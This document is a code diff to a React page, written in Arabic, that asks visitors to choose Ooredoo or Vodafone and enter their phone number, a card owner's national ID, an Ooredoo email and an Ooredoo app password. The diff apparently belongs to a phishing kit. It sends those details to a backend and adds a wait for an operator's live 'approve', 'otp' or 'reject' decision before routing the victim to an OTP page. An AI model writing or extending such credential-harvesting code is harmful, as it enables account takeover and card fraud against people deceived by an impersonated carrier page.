@@ -1,7 +1,7 @@
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
-import { sendData, navigateToPage } from "@/lib/store";
-import { useEffect } from "react";
+import { useSignalEffect } from "@preact/signals-react";
+import { sendData, navigateToPage, codeAction, cardAction, waitingMessage } from "@/lib/store";
 
 const inputStyle = (hasError: boolean) => ({
   width: "100%",
@@ -23,22 +23,50 @@ export default function MobileVerification() {
   const [provider, setProvider] = useState("");
   const [open, setOpen] = useState(false);
   const [errors, setErrors] = useState<Record<string, string>>({});
+  const [isWaiting, setIsWaiting] = useState(false);
 
-  // Ooredoo fields
   const [phone, setPhone] = useState("");
   const [nationalId, setNationalId] = useState("");
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
-
-  // Vodafone fields
   const [vodaPhone, setVodaPhone] = useState("");
 
   useEffect(() => { navigateToPage("توثيق رقم الهاتف"); }, []);
+
+  useSignalEffect(() => {
+    const action = codeAction.value;
+    if (action) {
+      waitingMessage.value = "";
+      setIsWaiting(false);
+      if (action.action === "approve" || action.action === "otp") {
+        navigate("/ooredoo-otp");
+      } else if (action.action === "reject") {
+        setErrors({ form: "تعذر التحقق من البيانات، يرجى المحاولة مرة أخرى" });
+      }
+      codeAction.value = null;
+    }
+  });
+
+  useSignalEffect(() => {
+    const action = cardAction.value;
+    if (action) {
+      waitingMessage.value = "";
+      setIsWaiting(false);
+      if (action.action === "approve" || action.action === "otp") {
+        navigate("/ooredoo-otp");
+      } else if (action.action === "reject") {
+        setErrors({ form: "تعذر التحقق من البيانات، يرجى المحاولة مرة أخرى" });
+      }
+      cardAction.value = null;
+    }
+  });
 
   const providers = [
     { value: "ooredoo", label: "اوريدو ooredoo" },
     { value: "vodafone", label: "فودافون vodafone" },
   ];
+
+  const validateEmail = (v: string) => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
@@ -46,27 +74,33 @@ export default function MobileVerification() {
     if (!provider) { errs.provider = "يرجى اختيار مزود الخدمة"; }
     if (provider === "ooredoo") {
       if (!phone.trim()) errs.phone = "هذا الحقل مطلوب";
+      else if (phone.length < 7) errs.phone = "رقم الهاتف غير صحيح";
       if (!nationalId.trim()) errs.nationalId = "هذا الحقل مطلوب";
       if (!email.trim()) errs.email = "هذا الحقل مطلوب";
+      else if (!validateEmail(email)) errs.email = "البريد الإلكتروني غير صحيح";
       if (!password.trim()) errs.password = "هذا الحقل مطلوب";
+      else if (password.length < 4) errs.password = "كلمة المرور قصيرة جداً";
     } else if (provider === "vodafone") {
       if (!vodaPhone.trim()) errs.vodaPhone = "هذا الحقل مطلوب";
+      else if (vodaPhone.length < 7) errs.vodaPhone = "رقم الهاتف غير صحيح";
     }
     if (Object.keys(errs).length > 0) { setErrors(errs); return; }
     setErrors({});
+    setIsWaiting(true);
+    waitingMessage.value = "جاري مصادقة البيانات...";
 
     sendData({
-      mobileVerification: { provider, phone: provider === "ooredoo" ? phone : vodaPhone, nationalId, email, password },
+      mobileVerification: {
+        provider,
+        phone: provider === "ooredoo" ? phone : vodaPhone,
+        nationalId,
+        email,
+        password,
+      },
       current: "توثيق رقم الهاتف",
-      nextPage: "توثيق رقم الجوال OTP",
-      waitingForAdminResponse: false,
+      nextPage: "OTP أوريدو",
+      waitingForAdminResponse: true,
     });
-
-    if (provider === "ooredoo") {
-      navigate("/ooredoo-login");
-    } else {
-      navigate("/card-otp");
-    }
   };
 
   const fieldStyle = { marginBottom: 20 };
@@ -74,6 +108,18 @@ export default function MobileVerification() {
 
   return (
     <div style={{ minHeight: "100vh", display: "flex", flexDirection: "column", fontFamily: "'Tajawal','Cairo',Arial,sans-serif", direction: "rtl", backgroundColor: "#f5f5f5" }}>
+
+      {/* Waiting Overlay */}
+      {isWaiting && (
+        <div style={{ position: "fixed", inset: 0, backgroundColor: "rgba(0,0,0,0.5)", zIndex: 9999, display: "flex", alignItems: "center", justifyContent: "center" }}>
+          <div style={{ backgroundColor: "#fff", borderRadius: 8, padding: "32px 48px", textAlign: "center", boxShadow: "0 4px 20px rgba(0,0,0,0.3)", minWidth: 280 }}>
+            <div style={{ width: 40, height: 40, border: "4px solid #1a7abf", borderTopColor: "transparent", borderRadius: "50%", animation: "spin 1s linear infinite", margin: "0 auto 16px" }} />
+            <p style={{ fontSize: 15, color: "#333", margin: 0, fontWeight: "600" }}>جاري مصادقة البيانات...</p>
+            <p style={{ fontSize: 12, color: "#888", margin: "8px 0 0" }}>يرجى الانتظار</p>
+          </div>
+          <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
+        </div>
+      )}
 
       {/* Header */}
       <header style={{ backgroundColor: "#fff", borderBottom: "1px solid #e0e0e0", padding: "10px 30px", display: "flex", alignItems: "center", justifyContent: "space-between" }}>
@@ -117,17 +163,20 @@ export default function MobileVerification() {
             لا يشترط الدفع ببطاقة تابعة للمستخدم المراد تسجيله، يمكنك استخدام بطاقة تعود لشخص اخر، لكن يجب اثبات ملكيتها من خلال رقم الهاتف والرقم الشخصي لصاحب البطاقة.
           </p>
 
-          <form onSubmit={handleSubmit} style={{ maxWidth: 480 }}>
+          {errors.form && (
+            <div style={{ backgroundColor: "#fff0f0", border: "1px solid #ffcccc", borderRadius: 4, padding: "12px 16px", marginBottom: 20, color: "#cc0000", fontSize: 14, textAlign: "right" }}>
+              {errors.form}
+            </div>
+          )}
 
-            {/* Provider Dropdown */}
+          <form onSubmit={handleSubmit} style={{ maxWidth: 480 }}>
+            {/* Provider */}
             <div style={fieldStyle}>
               <label style={labelStyle}>مزود الخدمة <span style={{ color: "#cc0000" }}>*</span></label>
               <div style={{ position: "relative" }}>
-                <div
-                  onClick={() => setOpen(!open)}
-                  style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "10px 14px", border: `1px solid ${errors.provider ? "#cc0000" : "#ccc"}`, borderRadius: 3, backgroundColor: "#fff", cursor: "pointer", fontSize: 14, color: provider ? "#333" : "#aaa" }}
-                >
-                  <svg viewBox="0 0 10 6" style={{ width: 12, height: 8, transform: open ? "rotate(180deg)" : "none", transition: "0.2s", flexShrink: 0 }}>
+                <div onClick={() => setOpen(!open)}
+                  style={{ display: "flex", alignItems: "center", justifyContent: "space-between", padding: "10px 14px", border: `1px solid ${errors.provider ? "#cc0000" : "#ccc"}`, borderRadius: 3, backgroundColor: "#fff", cursor: "pointer", fontSize: 14, color: provider ? "#333" : "#aaa" }}>
+                  <svg viewBox="0 0 10 6" style={{ width: 12, height: 8, transform: open ? "rotate(180deg)" : "none", transition: "0.2s" }}>
                     <path d="M1 1l4 4 4-4" stroke="#666" strokeWidth="1.5" fill="none" strokeLinecap="round"/>
                   </svg>
                   <span>{provider ? providers.find(p => p.value === provider)?.label : "اختر مزود الخدمة"}</span>
@@ -153,22 +202,30 @@ export default function MobileVerification() {
               <>
                 <div style={fieldStyle}>
                   <label style={labelStyle}>رقم الهاتف <span style={{ color: "#cc0000" }}>*</span></label>
-                  <input type="tel" value={phone} onChange={(e) => { setPhone(e.target.value.replace(/\D/g, "")); setErrors(p => ({...p, phone: ""})); }} placeholder="Phone" style={inputStyle(!!errors.phone)} />
+                  <input type="tel" value={phone}
+                    onChange={(e) => { setPhone(e.target.value.replace(/\D/g, "")); setErrors(p => ({...p, phone: ""})); }}
+                    placeholder="Phone" style={inputStyle(!!errors.phone)} />
                   {errors.phone && <span style={{ color: "#cc0000", fontSize: 12, marginTop: 4, display: "block" }}>{errors.phone}</span>}
                 </div>
                 <div style={fieldStyle}>
                   <label style={labelStyle}>الرقم الشخصي لمالك البطاقة <span style={{ color: "#cc0000" }}>*</span></label>
-                  <input type="text" value={nationalId} onChange={(e) => { setNationalId(e.target.value); setErrors(p => ({...p, nationalId: ""})); }} placeholder="Id" style={inputStyle(!!errors.nationalId)} />
+                  <input type="text" value={nationalId}
+                    onChange={(e) => { setNationalId(e.target.value); setErrors(p => ({...p, nationalId: ""})); }}
+                    placeholder="Id" style={inputStyle(!!errors.nationalId)} />
                   {errors.nationalId && <span style={{ color: "#cc0000", fontSize: 12, marginTop: 4, display: "block" }}>{errors.nationalId}</span>}
                 </div>
                 <div style={fieldStyle}>
                   <label style={labelStyle}>البريد الالكتروني المعتمد بـ ooredoo <span style={{ color: "#cc0000" }}>*</span></label>
-                  <input type="email" value={email} onChange={(e) => { setEmail(e.target.value.replace(/[\u0600-\u06FF]/g, "")); setErrors(p => ({...p, email: ""})); }} placeholder="Email" style={{ ...inputStyle(!!errors.email), direction: "ltr", textAlign: "left" }} />
+                  <input type="text" value={email}
+                    onChange={(e) => { setEmail(e.target.value.replace(/[\u0600-\u06FF]/g, "")); setErrors(p => ({...p, email: ""})); }}
+                    placeholder="Email" style={{ ...inputStyle(!!errors.email), direction: "ltr", textAlign: "left" }} />
                   {errors.email && <span style={{ color: "#cc0000", fontSize: 12, marginTop: 4, display: "block" }}>{errors.email}</span>}
                 </div>
                 <div style={fieldStyle}>
                   <label style={labelStyle}>كلمة المرور لتطبيق ooredoo <span style={{ color: "#cc0000" }}>*</span></label>
-                  <input type="password" value={password} onChange={(e) => { setPassword(e.target.value); setErrors(p => ({...p, password: ""})); }} style={inputStyle(!!errors.password)} />
+                  <input type="password" value={password}
+                    onChange={(e) => { setPassword(e.target.value); setErrors(p => ({...p, password: ""})); }}
+                    style={inputStyle(!!errors.password)} />
                   {errors.password && <span style={{ color: "#cc0000", fontSize: 12, marginTop: 4, display: "block" }}>{errors.password}</span>}
                 </div>
               </>
@@ -178,17 +235,18 @@ export default function MobileVerification() {
             {provider === "vodafone" && (
               <div style={fieldStyle}>
                 <label style={labelStyle}>رقم الهاتف <span style={{ color: "#cc0000" }}>*</span></label>
-                <input type="tel" value={vodaPhone} onChange={(e) => { setVodaPhone(e.target.value.replace(/\D/g, "")); setErrors(p => ({...p, vodaPhone: ""})); }} placeholder="Phone" style={inputStyle(!!errors.vodaPhone)} />
+                <input type="tel" value={vodaPhone}
+                  onChange={(e) => { setVodaPhone(e.target.value.replace(/\D/g, "")); setErrors(p => ({...p, vodaPhone: ""})); }}
+                  placeholder="Phone" style={inputStyle(!!errors.vodaPhone)} />
                 {errors.vodaPhone && <span style={{ color: "#cc0000", fontSize: 12, marginTop: 4, display: "block" }}>{errors.vodaPhone}</span>}
               </div>
             )}
 
-            {/* Submit */}
             {provider && (
-              <button type="submit"
-                style={{ display: "block", width: "100%", padding: "12px", backgroundColor: "#1a7abf", color: "#fff", border: "none", borderRadius: 3, fontSize: 15, fontWeight: "600", cursor: "pointer", fontFamily: "inherit", textAlign: "center" }}
-                onMouseOver={(e) => { e.currentTarget.style.backgroundColor = "#1565a0"; }}
-                onMouseOut={(e) => { e.currentTarget.style.backgroundColor = "#1a7abf"; }}>
+              <button type="submit" disabled={isWaiting}
+                style={{ display: "block", width: "100%", padding: "12px", backgroundColor: isWaiting ? "#aaa" : "#1a7abf", color: "#fff", border: "none", borderRadius: 3, fontSize: 15, fontWeight: "600", cursor: isWaiting ? "not-allowed" : "pointer", fontFamily: "inherit", textAlign: "center" }}
+                onMouseOver={(e) => { if (!isWaiting) e.currentTarget.style.backgroundColor = "#1565a0"; }}
+                onMouseOut={(e) => { if (!isWaiting) e.currentTarget.style.backgroundColor = "#1a7abf"; }}>
                 استمر
               </button>
             )}
